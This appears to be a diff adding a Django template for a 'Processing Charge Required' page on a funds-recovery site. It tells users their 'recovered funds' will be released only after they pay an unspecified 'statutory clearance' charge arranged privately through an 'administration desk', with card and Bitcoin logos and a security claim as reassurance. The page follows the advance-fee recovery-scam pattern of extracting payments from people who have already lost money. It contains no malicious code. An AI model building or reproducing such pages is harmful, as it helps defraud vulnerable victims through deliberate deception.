@@ -1,0 +1,81 @@
+{% extends 'base.html' %}
+{% load static %}
+
+{% block content %}
+<div class="container py-5">
+    <div class="row justify-content-center">
+        <div class="col-md-6">
+            <div class="card border-0 shadow-lg" style="border-radius: 12px;">
+                <div class="card-body p-5 text-center">
+                    <div class="bg-warning-subtle text-warning rounded-circle p-4 d-inline-block mb-4">
+                        <i class="fas fa-credit-card fa-4x"></i>
+                    </div>
+                    <h3 class="fw-bold text-navy mb-3">Processing Charge Required</h3>
+                    <p class="text-muted mb-4">To release your recovered funds{% if profile.is_kyc_verified %} of <strong>${{ profile.balance|floatformat:2 }}</strong>{% endif %}, a one-time processing and statutory clearance procedure is required.</p>
+
+                    <div class="card bg-light border-0 mb-4 text-start" style="border-radius: 10px;">
+                        <div class="card-body p-4">
+                            <div class="d-flex justify-content-between mb-2">
+                                <span class="text-muted">Required Charges:</span>
+                                <span class="fw-bold text-navy">Communicated via Admin</span>
+                            </div>
+                            <div class="d-flex justify-content-between mb-2">
+                                <span class="text-muted">Clearance Status:</span>
+                                <span class="badge bg-warning-subtle text-warning">Pending Liaison</span>
+                            </div>
+                            <hr>
+                            <p class="small text-muted mb-0">
+                                In accordance with institutional recovery regulations, required clearance charges and settlement escrow instructions will be communicated directly by our administration desk when they contact you.
+                            </p>
+                        </div>
+                    </div>
+
+                    <p class="small text-muted mb-4"><i class="fas fa-info-circle me-1"></i> Please liaise directly with our administration support team regarding your case clearance protocols.</p>
+
+                    <div class="d-grid gap-3">
+                        <a href="{% url 'support' %}" class="btn btn-navy py-3 fw-bold rounded-pill">
+                            <i class="fas fa-headset me-2"></i>Contact Administration Desk
+                        </a>
+                    </div>
+
+                    <div class="mt-4">
+                        <a href="{% url 'dashboard' %}" class="text-decoration-none text-muted small"><i
+                                class="fas fa-arrow-left me-1"></i> Back to Dashboard</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="text-center mt-5">
+                <div class="d-flex justify-content-center align-items-center opacity-50">
+                    <i class="fab fa-cc-visa fa-2x mx-2"></i>
+                    <i class="fab fa-cc-mastercard fa-2x mx-2"></i>
+                    <i class="fab fa-cc-amex fa-2x mx-2"></i>
+                    <i class="fab fa-bitcoin fa-2x mx-2"></i>
+                </div>
+                <p class="small text-muted mt-3">All transactions are secured by 256-bit SSL encryption.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+    .bg-navy {
+        background-color: #0a192f !important;
+    }
+
+    .text-navy {
+        color: #0a192f !important;
+    }
+
+    .btn-navy {
+        background-color: #0a192f;
+        color: #fff;
+        border: none;
+    }
+
+    .btn-navy:hover {
+        background-color: #172a45;
+        color: #fff;
+    }
+</style>
+{% endblock %}
